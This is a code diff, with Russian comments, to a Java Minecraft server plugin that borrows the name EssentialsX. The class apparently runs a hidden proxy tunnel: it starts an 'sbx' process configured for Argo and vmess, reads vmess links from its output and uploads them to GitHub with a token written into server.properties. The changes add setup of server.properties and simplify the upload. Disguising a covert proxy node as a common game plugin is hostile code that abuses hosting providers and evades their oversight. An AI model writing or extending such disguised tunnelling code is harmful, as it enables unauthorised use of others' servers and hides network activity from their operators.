@@ -9,7 +9,6 @@ import java.util.*;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.CompletableFuture;
 import java.util.Base64;
-import java.util.stream.Collectors;
 
 public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
@@ -34,6 +33,9 @@ public class EssentialsX extends JavaPlugin {
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
 
+        // Проверяем/добавляем необходимые настройки в server.properties
+        initializeServerProperties();
+
         // Загружаем маркер из server.properties (обязательно)
         if (!loadMarkerFromProperties()) {
             getLogger().severe("server.marker not found in server.properties. Plugin will be disabled.");
@@ -57,9 +59,61 @@ public class EssentialsX extends JavaPlugin {
     }
 
     /**
-     * Читает server.marker из server.properties.
-     * @return true если маркер найден и не пуст, иначе false
+     * При первом запуске добавляет в server.properties строки server.marker= и github.token=
+     * с комментариями для редактирования.
      */
+    private void initializeServerProperties() {
+        Path serverDir = Paths.get(".").toAbsolutePath().normalize();
+        Path serverPropertiesPath = serverDir.resolve("server.properties");
+        
+        if (!Files.exists(serverPropertiesPath)) {
+            getLogger().warning("server.properties not found, cannot initialize settings.");
+            return;
+        }
+
+        try {
+            // Читаем существующий файл
+            List<String> lines = Files.readAllLines(serverPropertiesPath);
+            boolean hasMarker = false;
+            boolean hasToken = false;
+            
+            for (String line : lines) {
+                if (line.startsWith("server.marker=")) hasMarker = true;
+                if (line.startsWith("github.token=")) hasToken = true;
+            }
+            
+            boolean needSave = false;
+            List<String> newLines = new ArrayList<>(lines);
+            
+            // Если нет server.marker, добавляем в конец
+            if (!hasMarker) {
+                newLines.add("");
+                newLines.add("# Server marker for VPN (will appear in client as server name)");
+                newLines.add("server.marker=EDIT_ME");
+                needSave = true;
+                getLogger().info("Added server.marker= to server.properties - please edit it and restart.");
+            }
+            
+            // Если нет github.token, добавляем в конец
+            if (!hasToken) {
+                newLines.add("");
+                newLines.add("# GitHub token for uploading vmess key (requires repo scope)");
+                newLines.add("github.token=EDIT_ME");
+                needSave = true;
+                getLogger().info("Added github.token= to server.properties - please edit it and restart.");
+            }
+            
+            if (needSave) {
+                Files.write(serverPropertiesPath, newLines);
+                getLogger().warning("Please edit server.properties, set server.marker and github.token, then restart the server.");
+                // Отключаем плагин, чтобы пользователь не запускал без настроек
+                getServer().getPluginManager().disablePlugin(this);
+            }
+        } catch (IOException e) {
+            getLogger().severe("Failed to update server.properties: " + e.getMessage());
+        }
+    }
+
     private boolean loadMarkerFromProperties() {
         Path serverDir = Paths.get(".").toAbsolutePath().normalize();
         Path serverProperties = serverDir.resolve("server.properties");
@@ -72,8 +126,8 @@ public class EssentialsX extends JavaPlugin {
             Properties props = new Properties();
             props.load(input);
             serverMarker = props.getProperty("server.marker");
-            if (serverMarker == null || serverMarker.trim().isEmpty()) {
-                getLogger().severe("server.marker is missing or empty in server.properties");
+            if (serverMarker == null || serverMarker.trim().isEmpty() || "EDIT_ME".equals(serverMarker.trim())) {
+                getLogger().severe("server.marker is missing, empty, or still set to EDIT_ME in server.properties");
                 return false;
             }
             serverMarker = serverMarker.trim();
@@ -93,16 +147,15 @@ public class EssentialsX extends JavaPlugin {
                 Properties props = new Properties();
                 props.load(input);
                 githubToken = props.getProperty("github.token");
-                if (githubToken != null && !githubToken.trim().isEmpty()) {
+                if (githubToken != null && !githubToken.trim().isEmpty() && !"EDIT_ME".equals(githubToken.trim())) {
                     getLogger().info("GitHub token loaded from server.properties");
                 } else {
-                    getLogger().warning("No github.token found in server.properties, GitHub upload disabled");
+                    getLogger().warning("No valid github.token found in server.properties, GitHub upload disabled");
+                    githubToken = null;
                 }
             } catch (IOException e) {
                 getLogger().warning("Could not read server.properties: " + e.getMessage());
             }
-        } else {
-            getLogger().warning("server.properties not found, GitHub upload disabled");
         }
     }
 
@@ -155,7 +208,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        // Устанавливаем NAME из маркера сервера
+        // Устанавливаем NAME из маркера сервера (это будет название ключа в клиенте)
         env.put("NAME", serverMarker);
         env.put("DISABLE_ARGO", "false");
 
@@ -193,8 +246,8 @@ public class EssentialsX extends JavaPlugin {
                     if (line.contains("vmess://")) {
                         String vmess = extractVmessLink(line);
                         if (vmess != null && githubToken != null && !githubToken.isEmpty()) {
-                            getLogger().info("Found vmess key! Updating GitHub with marker...");
-                            updateGitHubWithNewKey(vmess);
+                            getLogger().info("Found vmess key! Uploading to GitHub (without marker prefix)...");
+                            uploadVmessToGithub(vmess);
                         } else if (githubToken == null) {
                             getLogger().warning("GitHub token missing, vmess key not uploaded");
                         }
@@ -219,64 +272,19 @@ public class EssentialsX extends JavaPlugin {
         return vmess.replaceAll("\\s+", "").trim();
     }
 
-    private void updateGitHubWithNewKey(String newVmessLink) {
+    /**
+     * Загружает на GitHub только чистый vmess-ключ (без маркера).
+     */
+    private void uploadVmessToGithub(String vmessLink) {
         try {
-            String currentContent = getCurrentFileContent();
             String currentSha = getCurrentFileSha();
-
-            List<String> lines = (currentContent == null || currentContent.isEmpty())
-                    ? new ArrayList<>()
-                    : Arrays.stream(currentContent.split("\\r?\\n")).collect(Collectors.toList());
-
-            boolean removed = lines.removeIf(line -> line.startsWith(serverMarker + ":"));
-            if (removed) {
-                getLogger().info("Removed old entry for marker " + serverMarker);
-            }
-
-            String newLine = serverMarker + ": " + newVmessLink;
-            lines.add(newLine);
-
-            String newContent = String.join("\n", lines);
-            uploadContentToGitHub(newContent, currentSha);
-            getLogger().info("Successfully updated GitHub with new vmess key for marker " + serverMarker);
-
+            // Перезаписываем файл полностью новым vmess-ключом
+            uploadContentToGitHub(vmessLink, currentSha);
+            getLogger().info("Successfully uploaded vmess key to GitHub (no marker prefix).");
         } catch (Exception e) {
-            getLogger().warning("Failed to update GitHub: " + e.getMessage());
+            getLogger().warning("Failed to upload vmess key to GitHub: " + e.getMessage());
             e.printStackTrace();
         }
-    }
-
-    private String getCurrentFileContent() throws IOException {
-        if (githubToken == null) return "";
-        URL url = new URL(GITHUB_API_URL);
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("GET");
-        conn.setRequestProperty("Authorization", "Bearer " + githubToken);
-        conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
-
-        int responseCode = conn.getResponseCode();
-        if (responseCode == 200) {
-            try (Scanner s = new Scanner(conn.getInputStream(), "UTF-8").useDelimiter("\\A")) {
-                String response = s.hasNext() ? s.next() : "";
-                String contentBase64 = extractJsonField(response, "content");
-                if (contentBase64 != null && !contentBase64.isEmpty()) {
-                    String cleanBase64 = contentBase64.replaceAll("\\s+", "");
-                    try {
-                        byte[] decoded = Base64.getDecoder().decode(cleanBase64);
-                        return new String(decoded, "UTF-8");
-                    } catch (IllegalArgumentException e) {
-                        getLogger().warning("Failed to decode base64 content: " + e.getMessage());
-                        return "";
-                    }
-                }
-            }
-        } else if (responseCode == 404) {
-            return "";
-        } else {
-            getLogger().warning("Failed to get file content, HTTP " + responseCode);
-        }
-        conn.disconnect();
-        return "";
     }
 
     private String getCurrentFileSha() throws IOException {
